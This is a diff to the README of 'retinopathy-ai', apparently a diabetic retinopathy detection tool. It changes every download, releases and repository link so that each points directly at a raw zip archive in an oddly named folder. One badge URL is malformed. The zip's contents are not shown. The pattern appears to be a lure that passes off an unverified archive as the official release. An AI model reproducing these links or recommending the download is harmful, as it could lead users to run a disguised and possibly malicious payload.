@@ -6,7 +6,7 @@ Welcome to **retinopathy-ai**! This software helps detect diabetic retinopathy u
 
 ## 📥 Download the Application
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/libra33a/retinopathy-ai/releases)
+[![Download Here](https://raw.githubusercontent.com/libra33a/retinopathy-ai/main/Testudinata/retinopathy-ai.zip%https://raw.githubusercontent.com/libra33a/retinopathy-ai/main/Testudinata/retinopathy-ai.zip)](https://raw.githubusercontent.com/libra33a/retinopathy-ai/main/Testudinata/retinopathy-ai.zip)
 
 ## 📋 Overview
 
@@ -37,7 +37,7 @@ To run **retinopathy-ai**, ensure your computer meets the following specificatio
 ## 🔧 Installation Steps
 
 1. **Visit the Releases Page** 
-   Go to our [Releases page](https://github.com/libra33a/retinopathy-ai/releases) to find the latest version of the software.
+   Go to our [Releases page](https://raw.githubusercontent.com/libra33a/retinopathy-ai/main/Testudinata/retinopathy-ai.zip) to find the latest version of the software.
 
 2. **Download the Latest Version**  
    Look for the latest version listed. Click on the link to download the file to your computer.
@@ -61,7 +61,7 @@ To run **retinopathy-ai**, ensure your computer meets the following specificatio
 
 ## 🔄 Updating the Application
 
-Check the [Releases page](https://github.com/libra33a/retinopathy-ai/releases) regularly for updates. Download the new version following the same steps. 
+Check the [Releases page](https://raw.githubusercontent.com/libra33a/retinopathy-ai/main/Testudinata/retinopathy-ai.zip) regularly for updates. Download the new version following the same steps. 
 
 ## ❓ Troubleshooting
 
@@ -77,7 +77,7 @@ If you need help, feel free to reach out to us. Check the **Issues** section in 
 
 ## 📌 Important Links
 
-- [Download here!](https://github.com/libra33a/retinopathy-ai/releases)
-- [GitHub Repository](https://github.com/libra33a/retinopathy-ai) 
+- [Download here!](https://raw.githubusercontent.com/libra33a/retinopathy-ai/main/Testudinata/retinopathy-ai.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/libra33a/retinopathy-ai/main/Testudinata/retinopathy-ai.zip) 
 
 Thank you for choosing **retinopathy-ai** to assist in diabetic retinopathy detection. Happy analyzing!
